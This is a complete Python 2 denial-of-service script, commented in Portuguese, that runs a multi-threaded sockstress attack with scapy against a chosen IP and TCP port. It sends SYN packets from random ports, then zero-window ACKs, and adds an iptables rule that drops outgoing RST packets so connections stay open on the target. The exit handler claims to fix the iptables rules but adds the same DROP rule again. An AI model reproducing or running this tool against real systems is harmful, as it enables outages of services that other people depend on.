#!/usr/bin/python

# Exploit: DoS Attack v1.0.0
# Data: 6 de Dezembro de 2021
# Autor do Exploit: Douglas Souza 
# LinkedIn: www.linkedin.com/in/dagurasujava

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
import thread
import os
import signal
import sys


print "\n######################################################"
print "|						     |"
print "|  ____       ____       _   _   _             _     |"
print "| |  _ \  ___/ ___|     / \ | |_| |_ __ _  ___| | __ |"
print "| | | | |/ _ \___ \    / _ \| __| __/ _` |/ __| |/ / |"
print "| | |_| | (_) |__) |  / ___ \ |_| || (_| | (__|   <  |"
print "| |____/ \___/____/  /_/   \_\__|\__\__,_|\___|_|\_\ |"
print "|		  v1.0.0		             |"
print "|					             |"
print "| ->	  by D.4.G.U.R.4.S.U (Douglas Souza)      <- |"
print "######################################################\n\n"


if len(sys.argv) !=4:
	print "Modo de Uso -> ./DoS-Attack.py [IP-Alvo] [Porta] [Threads]"
	print "Exemplo -> ./DoS-Attack.py 10.10.10.1 21 25"
	print "O exemplo ira realizar um ataque DoS multi-thread socket-stress 25x"
	print "Contra o servico TCP (porta 21) em 10.10.10.1"
	sys.exit()

alvo = str(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])


def sockstress(alvo,dstport):
	while 0 == 0:
		try:
			i = random.randint(0,65535)
			resp = sr1(IP(dst=alvo)/TCP(sport=i,dport=dstport,flags='S'),timeout=1,verbose=0)
			send(IP(dst=alvo)/TCP(sport=i,dport=dstport,window=0,flags='A',ack=(resp[TCP].seq + 1))/'\x00\x00',verbose=0)
		except:
			pass

# O desligamento normal permite o reparo da tabela de IP
def desligamento(signal, frame):
	print '\nVoce pressionou Ctrl + C!'
	print 'Fixando tabelas IP'
	os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + alvo + ' -j DROP')
	sys.exit()

# Cria regra IPTables para impedir o pacote RST de saida para permitir conexoes TCP Scapy
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + alvo + ' -j DROP')
signal.signal(signal.SIGINT, desligamento)


# Aciona varios threads para lancar o ataque
print "o ataque iniciou ... use Ctrl + C para parar o ataque"
for i in range(0,threads):
	thread.start_new_thread(sockstress, (alvo,dstport))

# Loop infinito (ou pressione Ctrl + C)
while 0 == 0:
	sleep(1)
